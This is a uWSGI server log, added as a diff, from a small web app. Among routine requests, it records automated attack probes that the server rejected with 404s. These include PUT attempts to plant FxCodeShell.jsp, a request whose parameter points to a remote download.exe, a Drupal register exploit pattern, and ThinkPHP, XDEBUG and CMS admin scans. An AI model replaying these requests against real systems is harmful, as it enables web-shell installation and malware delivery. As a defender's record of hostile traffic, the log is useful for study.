@@ -1,0 +1,171 @@
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Dec 30 17:49:01 2019] ***
+compiled with version: 7.4.0 on 27 December 2019 06:18:08
+os: Linux-4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019
+nodename: iZwz98qk0tbl2zkmk5uf79Z
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 2
+current working directory: /home/personal_system/uwsgi
+writing pidfile to /home/personal_system/uwsgi/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/personal_system/
+your processes number limit is 3522
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 172.18.254.51:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x56299e734a60
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166688 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56299e734a60 pid: 16340 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 16340)
+spawned uWSGI worker 1 (pid: 16343, cores: 2)
+[pid: 16343|app: 0|req: 1/1] 14.146.95.112 () {42 vars in 746 bytes} [Mon Dec 30 09:49:16 2019] GET / => generated 16351 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 2/2] 14.146.95.112 () {42 vars in 753 bytes} [Mon Dec 30 09:49:19 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 3/3] 14.146.95.112 () {42 vars in 753 bytes} [Mon Dec 30 09:49:19 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 4/4] 14.146.95.112 () {42 vars in 746 bytes} [Mon Dec 30 09:52:08 2019] GET / => generated 16351 bytes in 19 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 5/5] 14.146.95.112 () {42 vars in 746 bytes} [Mon Dec 30 09:52:48 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 6/6] 14.146.95.112 () {42 vars in 746 bytes} [Mon Dec 30 09:53:43 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 7/7] 14.146.95.112 () {42 vars in 753 bytes} [Mon Dec 30 09:53:45 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+-- unavailable modifier requested: 3 --
+[pid: 16343|app: 0|req: 8/10] 145.133.10.120 () {32 vars in 471 bytes} [Mon Dec 30 11:24:23 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+Not Found: /index.php
+[pid: 16343|app: 0|req: 9/11] 159.203.4.53 () {36 vars in 639 bytes} [Mon Dec 30 12:54:13 2019] GET /index.php => generated 1973 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 10/12] 14.147.104.180 () {42 vars in 747 bytes} [Mon Dec 30 12:57:12 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 11/13] 152.249.101.52 () {32 vars in 465 bytes} [Mon Dec 30 14:07:52 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 16343|app: 0|req: 12/14] 101.251.242.238 () {38 vars in 597 bytes} [Mon Dec 30 14:27:39 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+Not Found: /FxCodeShell.jsp 
+[pid: 16343|app: 0|req: 13/15] 47.107.191.195 () {42 vars in 647 bytes} [Mon Dec 30 17:05:47 2019] PUT /FxCodeShell.jsp%20 => generated 1996 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 16343|app: 0|req: 14/16] 47.107.191.195 () {42 vars in 661 bytes} [Mon Dec 30 17:05:47 2019] PUT /FxCodeShell.jsp::$DATA => generated 2012 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /FxCodeShell.jsp/
+[pid: 16343|app: 0|req: 15/17] 47.107.191.195 () {42 vars in 643 bytes} [Mon Dec 30 17:05:47 2019] PUT /FxCodeShell.jsp/ => generated 1994 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp
+[pid: 16343|app: 0|req: 16/18] 47.107.191.195 () {38 vars in 768 bytes} [Mon Dec 30 17:05:47 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fk.openyourass.club/download.exe => generated 2076 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 17/19] 37.49.230.100 () {30 vars in 336 bytes} [Mon Dec 30 17:34:25 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 18/20] 37.49.230.100 () {28 vars in 307 bytes} [Mon Dec 30 17:34:25 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 19/21] 37.49.230.100 () {28 vars in 307 bytes} [Mon Dec 30 17:34:26 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+[pid: 16343|app: 0|req: 20/23] 54.67.84.164 () {34 vars in 498 bytes} [Mon Dec 30 18:35:39 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 21/24] 36.80.51.96 () {32 vars in 462 bytes} [Mon Dec 30 18:45:45 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 22/25] 101.128.72.200 () {32 vars in 465 bytes} [Mon Dec 30 19:11:03 2019] GET / => generated 16351 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+Not Found: /user/register
+[pid: 16343|app: 0|req: 23/26] 47.107.191.195 () {42 vars in 912 bytes} [Mon Dec 30 21:40:14 2019] POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax => generated 2072 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 16709 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 16343|app: 0|req: 24/28] 139.162.106.181 () {32 vars in 401 bytes} [Mon Dec 30 22:53:07 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+Not Found: /TP/public/index.php
+[pid: 16343|app: 0|req: 25/29] 198.11.177.149 () {34 vars in 501 bytes} [Mon Dec 30 22:59:38 2019] GET /TP/public/index.php => generated 2003 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /TP/index.php
+[pid: 16343|app: 0|req: 26/30] 198.11.177.149 () {34 vars in 487 bytes} [Mon Dec 30 22:59:39 2019] GET /TP/index.php => generated 1982 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /thinkphp/html/public/index.php
+[pid: 16343|app: 0|req: 27/31] 198.11.177.149 () {34 vars in 523 bytes} [Mon Dec 30 22:59:39 2019] GET /thinkphp/html/public/index.php => generated 2036 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /html/public/index.php
+[pid: 16343|app: 0|req: 28/32] 198.11.177.149 () {34 vars in 505 bytes} [Mon Dec 30 22:59:39 2019] GET /html/public/index.php => generated 2009 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /public/index.php
+[pid: 16343|app: 0|req: 29/33] 198.11.177.149 () {34 vars in 495 bytes} [Mon Dec 30 22:59:40 2019] GET /public/index.php => generated 1994 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /TP/html/public/index.php
+[pid: 16343|app: 0|req: 30/34] 198.11.177.149 () {34 vars in 511 bytes} [Mon Dec 30 22:59:40 2019] GET /TP/html/public/index.php => generated 2018 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /elrekt.php
+[pid: 16343|app: 0|req: 31/35] 198.11.177.149 () {34 vars in 483 bytes} [Mon Dec 30 22:59:41 2019] GET /elrekt.php => generated 1976 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /index.php
+[pid: 16343|app: 0|req: 32/36] 198.11.177.149 () {34 vars in 481 bytes} [Mon Dec 30 22:59:41 2019] GET /index.php => generated 1973 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 33/37] 198.11.177.149 () {34 vars in 466 bytes} [Mon Dec 30 22:59:41 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 16343|app: 0|req: 34/38] 193.57.40.46 () {34 vars in 554 bytes} [Tue Dec 31 00:46:27 2019] GET /?XDEBUG_SESSION_START=phpstorm => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+[pid: 16343|app: 0|req: 35/40] 184.154.74.66 () {34 vars in 482 bytes} [Tue Dec 31 02:13:09 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 36/41] 14.147.107.221 () {40 vars in 723 bytes} [Tue Dec 31 02:23:54 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 16343|app: 0|req: 37/42] 14.147.107.221 () {40 vars in 662 bytes} [Tue Dec 31 02:23:54 2019] GET /favicon.ico => generated 1979 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp 
+[pid: 16343|app: 0|req: 38/43] 47.107.191.195 () {42 vars in 647 bytes} [Tue Dec 31 04:35:38 2019] PUT /FxCodeShell.jsp%20 => generated 1996 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 16343|app: 0|req: 39/44] 47.107.191.195 () {42 vars in 661 bytes} [Tue Dec 31 04:35:38 2019] PUT /FxCodeShell.jsp::$DATA => generated 2012 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp/
+[pid: 16343|app: 0|req: 40/45] 47.107.191.195 () {42 vars in 643 bytes} [Tue Dec 31 04:35:38 2019] PUT /FxCodeShell.jsp/ => generated 1994 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /FxCodeShell.jsp
+[pid: 16343|app: 0|req: 41/46] 47.107.191.195 () {38 vars in 768 bytes} [Tue Dec 31 04:35:38 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fk.openyourass.club/download.exe => generated 2076 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 42/47] 31.15.88.43 () {32 vars in 462 bytes} [Tue Dec 31 04:46:12 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+[pid: 16343|app: 0|req: 43/49] 89.179.126.96 () {36 vars in 562 bytes} [Tue Dec 31 07:28:59 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 44/50] 47.107.66.102 () {42 vars in 806 bytes} [Tue Dec 31 07:56:12 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+Not Found: /index.php
+[pid: 16343|app: 0|req: 45/51] 47.107.66.102 () {42 vars in 834 bytes} [Tue Dec 31 07:56:12 2019] GET /index.php => generated 1973 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /robots.txt
+[pid: 16343|app: 0|req: 46/52] 64.225.4.187 () {34 vars in 522 bytes} [Tue Dec 31 09:26:57 2019] GET /robots.txt => generated 1976 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 47/53] 64.225.4.187 () {34 vars in 502 bytes} [Tue Dec 31 09:26:58 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+Not Found: /xmlrpc.php
+[pid: 16343|app: 0|req: 48/54] 64.225.4.187 () {34 vars in 529 bytes} [Tue Dec 31 09:26:59 2019] GET /xmlrpc.php?rsd => generated 1980 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /blog/robots.txt
+[pid: 16343|app: 0|req: 49/55] 64.225.4.187 () {34 vars in 532 bytes} [Tue Dec 31 09:27:00 2019] GET /blog/robots.txt => generated 1991 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /blog/
+[pid: 16343|app: 0|req: 50/56] 64.225.4.187 () {34 vars in 512 bytes} [Tue Dec 31 09:27:01 2019] GET /blog/ => generated 1961 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /wordpress/
+[pid: 16343|app: 0|req: 51/57] 64.225.4.187 () {34 vars in 522 bytes} [Tue Dec 31 09:27:02 2019] GET /wordpress/ => generated 1976 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /wp/
+[pid: 16343|app: 0|req: 52/58] 64.225.4.187 () {34 vars in 508 bytes} [Tue Dec 31 09:27:03 2019] GET /wp/ => generated 1955 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /robots.txt
+[pid: 16343|app: 0|req: 53/59] 64.225.4.187 () {34 vars in 522 bytes} [Tue Dec 31 09:27:04 2019] GET /robots.txt => generated 1976 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /administrator/index.php
+[pid: 16343|app: 0|req: 54/60] 64.225.4.187 () {34 vars in 548 bytes} [Tue Dec 31 09:27:05 2019] GET /administrator/index.php => generated 2015 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /blog/robots.txt
+[pid: 16343|app: 0|req: 55/61] 64.225.4.187 () {34 vars in 532 bytes} [Tue Dec 31 09:27:06 2019] GET /blog/robots.txt => generated 1991 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /blog/administrator/index.php
+[pid: 16343|app: 0|req: 56/62] 64.225.4.187 () {34 vars in 558 bytes} [Tue Dec 31 09:27:07 2019] GET /blog/administrator/index.php => generated 2030 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+Not Found: /joomla/robots.txt
+[pid: 16343|app: 0|req: 57/63] 64.225.4.187 () {34 vars in 536 bytes} [Tue Dec 31 09:27:07 2019] GET /joomla/robots.txt => generated 1997 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /joomla/administrator/index.php
+[pid: 16343|app: 0|req: 58/64] 64.225.4.187 () {34 vars in 562 bytes} [Tue Dec 31 09:27:08 2019] GET /joomla/administrator/index.php => generated 2036 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 21573 (max 4096)...skip
+[pid: 16343|app: 0|req: 59/66] 47.92.124.187 () {34 vars in 459 bytes} [Tue Dec 31 10:50:44 2019] GET / => generated 16351 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 60/67] 103.115.126.34 () {32 vars in 464 bytes} [Tue Dec 31 11:07:22 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 16343|app: 0|req: 61/68] 193.57.40.46 () {34 vars in 554 bytes} [Tue Dec 31 11:35:44 2019] GET /?XDEBUG_SESSION_START=phpstorm => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 1)
+[pid: 16343|app: 0|req: 62/69] 121.32.198.201 () {42 vars in 747 bytes} [Tue Dec 31 11:38:06 2019] GET / => generated 16351 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 123 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 16343|app: 0|req: 63/70] 121.32.198.201 () {40 vars in 668 bytes} [Tue Dec 31 11:38:07 2019] GET /favicon.ico => generated 1979 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 1)
